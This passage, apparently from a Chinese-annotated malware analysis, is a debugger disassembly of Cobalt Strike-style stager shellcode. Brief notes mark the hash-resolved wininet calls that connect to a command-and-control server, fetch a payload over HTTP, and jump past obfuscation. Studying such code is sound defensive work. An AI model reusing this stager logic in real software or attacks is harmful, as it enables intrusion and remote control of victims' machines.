class="number">8</span>B0C4B                   <span class="operator">|</span> mov cx,word ptr ds:[ebx<span class="operator">+</span>ecx<span class="operator">*</span><span class="number">2</span>]                  <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440CA                                         <span class="operator">|</span> <span class="number">8</span>B58 <span class="number">1</span>C                     <span class="operator">|</span> mov ebx,dword ptr ds:[eax<span class="operator">+</span><span class="number">1</span>C]                   <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span><span class="number">1</span>C]:buf<span class="operator">+</span><span class="number">1</span>C</span><br><span class="line"><span class="number">00</span>D440CD                                         <span class="operator">|</span> <span class="number">01</span>D3                        <span class="operator">|</span> <span class="keyword">add</span> ebx,edx                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440CF                                         <span class="operator">|</span> <span class="number">8</span>B048B                      <span class="operator">|</span> mov eax,dword ptr ds:[ebx<span class="operator">+</span>ecx<span class="operator">*</span><span class="number">4</span>]                <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D440D2                                         <span class="operator">|</span> <span class="number">01</span>D0                        <span class="operator">|</span> <span class="keyword">add</span> eax,edx                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D440D4                                         <span class="operator">|</span> <span class="number">894424</span> <span class="number">24</span>                   <span class="operator">|</span> mov dword ptr ss:[esp<span class="operator">+</span><span class="number">24</span>],eax                   <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D440D8                                         <span class="operator">|</span> <span class="number">5</span>B                          <span class="operator">|</span> pop ebx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440D9                                         <span class="operator">|</span> <span class="number">5</span>B                          <span class="operator">|</span> pop ebx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440DA                                         <span class="operator">|</span> <span class="number">61</span>                          <span class="operator">|</span> popad                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440DB                                         <span class="operator">|</span> <span class="number">59</span>                          <span class="operator">|</span> pop ecx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440DC                                         <span class="operator">|</span> <span class="number">5</span>A                          <span class="operator">|</span> pop edx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440DD                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440DE                                         <span class="operator">|</span> FFE0                        <span class="operator">|</span> jmp eax      调用目标函数                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D440E0                                         <span class="operator">|</span> <span class="number">58</span>                          <span class="operator">|</span> pop eax                                         <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D440E1                                         <span class="operator">|</span> <span class="number">5</span>F                          <span class="operator">|</span> pop edi                                         <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440E2                                         <span class="operator">|</span> <span class="number">5</span>A                          <span class="operator">|</span> pop edx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440E3                                         <span class="operator">|</span> <span class="number">8</span>B12                        <span class="operator">|</span> mov edx,dword ptr ds:[edx]                      <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440E5                                         <span class="operator">|</span> EB <span class="number">86</span>                       <span class="operator">|</span> jmp cs_shellcode.D4406D                         <span class="operator">|</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Loadlibrary（&quot;wininet.dll&quot;）</span><br><span class="line"><span class="number">00</span>D440E7                                         <span class="operator">|</span> <span class="number">5</span>D                          <span class="operator">|</span> pop ebp                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440E8                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">6E657400</span>                 <span class="operator">|</span> push <span class="number">74656</span>E                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440ED                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">77696E69</span>                 <span class="operator">|</span> push <span class="number">696E6977</span>                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440F2 <span class="operator">&lt;</span>cs_shellcode.<span class="operator">&amp;</span>RtlSleepConditionVariabl <span class="operator">|</span> <span class="number">54</span>                          <span class="operator">|</span> push esp                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440F3                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">4</span>C772607                 <span class="operator">|</span> push <span class="number">726774</span>C                                    <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D440F8                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line">wininet.internetOpenA(<span class="keyword">null</span>)</span><br><span class="line"><span class="number">00</span>D440FA                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440FC                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440FD                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440FE                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D440FF                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44100                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44101                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">3</span>A5679A7                 <span class="operator">|</span> push A779563A                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44106                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line">这里有会反复跳转，最终还是会跳转到下一个汇编D4410D处，此处是一个混淆</span><br><span class="line"><span class="number">00</span>D44108                                         <span class="operator">|</span> E9 <span class="number">84000000</span>                 <span class="operator">|</span> jmp cs_shellcode.D44191</span><br><span class="line">wininet.InternetConnetA(C2地址)                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4410D                                         <span class="operator">|</span> <span class="number">5</span>B                          <span class="operator">|</span> pop ebx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4410E                                         <span class="operator">|</span> <span class="number">31</span>C9                        <span class="operator">|</span> xor ecx,ecx                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44110                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44111                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44112                                         <span class="operator">|</span> <span class="number">6</span>A <span class="number">03</span>                       <span class="operator">|</span> push <span class="number">3</span>                                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44114                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44115                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44116                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">50000000</span>                 <span class="operator">|</span> push <span class="number">50</span>                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4411B                                         <span class="operator">|</span> <span class="number">53</span>                          <span class="operator">|</span> push ebx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4411C                                         <span class="operator">|</span> <span class="number">50</span>                          <span class="operator">|</span> push eax                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4411D                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">57899</span>FC6                 <span class="operator">|</span> push C69F8957                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44122                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line">混淆</span><br><span class="line"><span class="number">00</span>D44124                                         <span class="operator">|</span> EB <span class="number">70</span>                       <span class="operator">|</span> jmp cs_shellcode.D44196                         <span class="operator">|</span></span><br><span class="line">wininet.HttpOpenRequestA</span><br><span class="line"><span class="number">00</span>D44126                                         <span class="operator">|</span> <span class="number">5</span>B                          <span class="operator">|</span> pop ebx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44127                                         <span class="operator">|</span> <span class="number">31</span>D2                        <span class="operator">|</span> xor edx,edx                                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44129                                         <span class="operator">|</span> <span class="number">52</span>                          <span class="operator">|</span> push edx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4412A                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">00024084</span>                 <span class="operator">|</span> push <span class="number">84400200</span>                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4412F                                         <span class="operator">|</span> <span class="number">52</span>                          <span class="operator">|</span> push edx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44130                                         <span class="operator">|</span> <span class="number">52</span>                          <span class="operator">|</span> push edx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44131                                         <span class="operator">|</span> <span class="number">52</span>                          <span class="operator">|</span> push edx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44132                                         <span class="operator">|</span> <span class="number">53</span>                          <span class="operator">|</span> push ebx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44133                                         <span class="operator">|</span> <span class="number">52</span>                          <span class="operator">|</span> push edx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44134                                         <span class="operator">|</span> <span class="number">50</span>                          <span class="operator">|</span> push eax                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44135                                         <span class="operator">|</span> <span class="number">68</span> EB552E3B                 <span class="operator">|</span> push <span class="number">3</span>B2E55EB                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4413A                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line">wininet.HttpSendRequestA</span><br><span class="line"><span class="number">00</span>D4413C                                         <span class="operator">|</span> <span class="number">89</span>C6                        <span class="operator">|</span> mov esi,eax                                     <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;, eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4413E                                         <span class="operator">|</span> <span class="number">83</span>C3 <span class="number">50</span>                     <span class="operator">|</span> <span class="keyword">add</span> ebx,<span class="number">50</span>                                      <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44141                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44143                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44144                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44145                                         <span class="operator">|</span> <span class="number">6</span>A FF                       <span class="operator">|</span> push FFFFFFFF                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44147                                         <span class="operator">|</span> <span class="number">53</span>                          <span class="operator">|</span> push ebx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44148                                         <span class="operator">|</span> <span class="number">56</span>                          <span class="operator">|</span> push esi                                        <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D44149                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">2</span>D06187B                 <span class="operator">|</span> push <span class="number">7</span>B18062D                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4414E                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line">判断是否连接成功</span><br><span class="line"><span class="number">00</span>D44150                                         <span class="operator">|</span> <span class="number">85</span>C0                        <span class="operator">|</span> test eax,eax                                    <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line">跳转到kernel32.ExitProcess</span><br><span class="line"><span class="number">00</span>D44152                                         <span class="operator">|</span> <span class="number">0</span>F84 C3010000               <span class="operator">|</span> je cs_shellcode.D4431B                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44158                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D4415A                                         <span class="operator">|</span> <span class="number">85</span>F6                        <span class="operator">|</span> test esi,esi                                    <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D4415C                                         <span class="operator">|</span> <span class="number">74</span> <span class="number">04</span>                       <span class="operator">|</span> je cs_shellcode.D44162                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4415E                                         <span class="operator">|</span> <span class="number">89</span>F9                        <span class="operator">|</span> mov ecx,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44160                                         <span class="operator">|</span> EB <span class="number">09</span>                       <span class="operator">|</span> jmp cs_shellcode.D4416B                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44162                                         <span class="operator">|</span> <span class="number">68</span> AAC5E25D                 <span class="operator">|</span> push <span class="number">5</span>DE2C5AA                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44167                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line">user32.GetDesktopWindow</span><br><span class="line"><span class="number">00</span>D44169                                         <span class="operator">|</span> <span class="number">89</span>C1                        <span class="operator">|</span> mov ecx,eax                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4416B                                         <span class="operator">|</span> <span class="number">68</span> <span class="number">45215E31</span>                 <span class="operator">|</span> push <span class="number">315E2145</span>                                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44170                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line">wininet.InternetErrorDlg</span><br><span class="line"><span class="number">00</span>D44172                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44174                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44175                                         <span class="operator">|</span> <span class="number">6</span>A <span class="number">07</span>                       <span class="operator">|</span> push <span class="number">7</span>                                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44177                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44178                                         <span class="operator">|</span> <span class="number">56</span>                          <span class="operator">|</span> push esi                                        <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D44179                                         <span class="operator">|</span> <span class="number">50</span>                          <span class="operator">|</span> push eax                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D4417A                                         <span class="operator">|</span> <span class="number">68</span> B757E00B                 <span class="operator">|</span> push BE057B7                                    <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4417F                                         <span class="operator">|</span> FFD5                        <span class="operator">|</span> <span class="keyword">call</span> ebp                                        <span class="operator">|</span></span><br><span class="line">下面这一段混淆居多</span><br><span class="line"><span class="number">00</span>D44181                                         <span class="operator">|</span> BF <span class="number">002</span>F0000                 <span class="operator">|</span> mov edi,<span class="number">2</span>F00                                    <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D44186                                         <span class="operator">|</span> <span class="number">39</span>C7                        <span class="operator">|</span> cmp edi,eax                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;, eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44188                                         <span class="operator">|</span> <span class="number">74</span> B7                       <span class="operator">|</span> je cs_shellcode.D44141                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4418A                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D4418C                                         <span class="operator">|</span> E9 <span class="number">91010000</span>                 <span class="operator">|</span> jmp cs_shellcode.D44322                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44191                                         <span class="operator">|</span> E9 C9010000                 <span class="operator">|</span> jmp cs_shellcode.D4435F                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44196                                         <span class="operator">|</span> E8 <span class="number">8</span>BFFFFFF                 <span class="operator">|</span> <span class="keyword">call</span> cs_shellcode.D44126                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4419B                                         <span class="operator">|</span> <span class="number">2</span>F                          <span class="operator">|</span> das                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4419C                                         <span class="operator">|</span> <span class="number">56</span>                          <span class="operator">|</span> push esi                                        <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D4419D                                         <span class="operator">|</span> <span class="number">6</span>F                          <span class="operator">|</span> outsd                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4419E                                         <span class="operator">|</span> <span class="number">45</span>                          <span class="operator">|</span> inc ebp                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D4419F                                         <span class="operator">|</span> <span class="number">52</span>                          <span class="operator">|</span> push edx                                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441A0                                         <span class="operator">|</span> <span class="number">00</span>D6                        <span class="operator">|</span> <span class="keyword">add</span> dh,dl                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441A2                                         <span class="operator">|</span> <span class="number">19</span>BF B32B27CB               <span class="operator">|</span> sbb dword ptr ds:[edi<span class="number">-34</span>D8D44D],edi             <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D441A8                                         <span class="operator">|</span> <span class="number">50</span>                          <span class="operator">|</span> push eax                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D441A9                                         <span class="operator">|</span> AE                          <span class="operator">|</span> scasb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441AA                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D441AB                                         <span class="operator">|</span> <span class="number">297</span>C22 D8                   <span class="operator">|</span> sub dword ptr ds:[edx<span class="number">-28</span>],edi                   <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\\ProgramData&quot;</span><br><span class="line"><span class="number">00</span>D441AF                                         <span class="operator">|</span> <span class="number">000444</span>                      <span class="operator">|</span> <span class="keyword">add</span> byte ptr ss:[esp<span class="operator">+</span>eax<span class="operator">*</span><span class="number">2</span>],al                  <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441B2                                         <span class="operator">|</span> C6                          <span class="operator">|</span> ???                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441B3                                         <span class="operator">|</span> <span class="number">3132</span>                        <span class="operator">|</span> xor dword ptr ds:[edx],esi                      <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D441B5                                         <span class="operator">|</span> D32D <span class="number">7</span>CA77661               <span class="operator">|</span> shr dword ptr ds:[<span class="number">6176</span>A77C],cl                  <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441BB                                         <span class="operator">|</span> A1 <span class="number">6</span>F797726                 <span class="operator">|</span> mov eax,dword ptr ds:[<span class="number">2677796</span>F]                 <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D441C0                                         <span class="operator">|</span> A0 <span class="number">1</span>F810DD2                 <span class="operator">|</span> mov al,byte ptr ds:[D20D811F]                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441C5                                         <span class="operator">|</span> <span class="number">7</span>E <span class="number">6</span>A                       <span class="operator">|</span> jle cs_shellcode.D44231                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441C7                                         <span class="operator">|</span> <span class="number">8</span>F                          <span class="operator">|</span> ???                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441C8                                         <span class="operator">|</span> B3 A6                       <span class="operator">|</span> mov bl,A6                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441CA                                         <span class="operator">|</span> AE                          <span class="operator">|</span> scasb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441CB                                         <span class="operator">|</span> A6                          <span class="operator">|</span> cmpsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441CC                                         <span class="operator">|</span> A6                          <span class="operator">|</span> cmpsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441CD                                         <span class="operator">|</span> <span class="number">3</span>E:<span class="number">24</span> A0                    <span class="operator">|</span> <span class="keyword">and</span> al,A0                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441D0                                         <span class="operator">|</span> <span class="number">27</span>                          <span class="operator">|</span> daa                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441D1                                         <span class="operator">|</span> <span class="number">95</span>                          <span class="operator">|</span> xchg ebp,eax                                    <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D441D2                                         <span class="operator">|</span> C9                          <span class="operator">|</span> leave                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441D3                                         <span class="operator">|</span> <span class="number">67</span>:C4A3 <span class="number">8120</span>                <span class="operator">|</span> les esp,fword ptr ss:[bp<span class="operator">+</span>di<span class="operator">+</span><span class="number">2081</span>]               <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441D8                                         <span class="operator">|</span> B5 <span class="number">51</span>                       <span class="operator">|</span> mov ch,<span class="number">51</span>                                       <span class="operator">|</span> <span class="number">51</span>:<span class="string">&#x27;Q&#x27;</span></span><br><span class="line"><span class="number">00</span>D441DA                                         <span class="operator">|</span> <span class="number">20</span>AB D0E44278               <span class="operator">|</span> <span class="keyword">and</span> byte ptr ds:[ebx<span class="operator">+</span><span class="number">7842E4</span>D0],ch               <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441E0                                         <span class="operator">|</span> AD                          <span class="operator">|</span> lodsd                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441E1                                         <span class="operator">|</span> D13A                        <span class="operator">|</span> sar dword ptr ds:[edx],<span class="number">1</span>                        <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441E3                                         <span class="operator">|</span> <span class="number">9</span>F                          <span class="operator">|</span> lahf                                            <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441E4                                         <span class="operator">|</span> <span class="number">60</span>                          <span class="operator">|</span> pushad                                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441E5                                         <span class="operator">|</span> <span class="number">7</span>D B7                       <span class="operator">|</span> jge cs_shellcode.D4419E                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441E7                                         <span class="operator">|</span> AC                          <span class="operator">|</span> lodsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441E8                                         <span class="operator">|</span> <span class="number">4</span>B                          <span class="operator">|</span> <span class="type">dec</span> ebx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441E9                                         <span class="operator">|</span> A2 <span class="number">00557365</span>                 <span class="operator">|</span> mov byte ptr ds:[<span class="number">65735500</span>],al                   <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441EE                                         <span class="operator">|</span> <span class="number">72</span> <span class="number">2</span>D                       <span class="operator">|</span> jb cs_shellcode.D4421D                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441F0                                         <span class="operator">|</span> <span class="number">41</span>                          <span class="operator">|</span> inc ecx                                         <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441F1                                         <span class="operator">|</span> <span class="number">6765</span>:<span class="number">6</span>E                     <span class="operator">|</span> outsb                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441F4                                         <span class="operator">|</span> <span class="number">74</span> <span class="number">3</span>A                       <span class="operator">|</span> je cs_shellcode.D44230                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441F6                                         <span class="operator">|</span> <span class="number">204</span>D <span class="number">6</span>F                     <span class="operator">|</span> <span class="keyword">and</span> byte ptr ss:[ebp<span class="operator">+</span><span class="number">6</span>F],cl                     <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441F9                                         <span class="operator">|</span> <span class="number">7</span>A <span class="number">69</span>                       <span class="operator">|</span> jp cs_shellcode.D44264                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441FB                                         <span class="operator">|</span> <span class="number">6</span>C                          <span class="operator">|</span> insb                                            <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441FC                                         <span class="operator">|</span> <span class="number">6</span>C                          <span class="operator">|</span> insb                                            <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441FD                                         <span class="operator">|</span> <span class="number">61</span>                          <span class="operator">|</span> popad                                           <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441FE                                         <span class="operator">|</span> <span class="number">2</span>F                          <span class="operator">|</span> das                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D441FF                                         <span class="operator">|</span> <span class="number">35</span> <span class="number">2E302028</span>                 <span class="operator">|</span> xor eax,<span class="number">2820302</span>E                                <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44204                                         <span class="operator">|</span> <span class="number">636</span>F <span class="number">6</span>D                     <span class="operator">|</span> arpl word ptr ds:[edi<span class="operator">+</span><span class="number">6</span>D],bp                    <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44207                                         <span class="operator">|</span> <span class="number">70</span> <span class="number">61</span>                       <span class="operator">|</span> jo cs_shellcode.D4426A                          <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44209                                         <span class="operator">|</span> 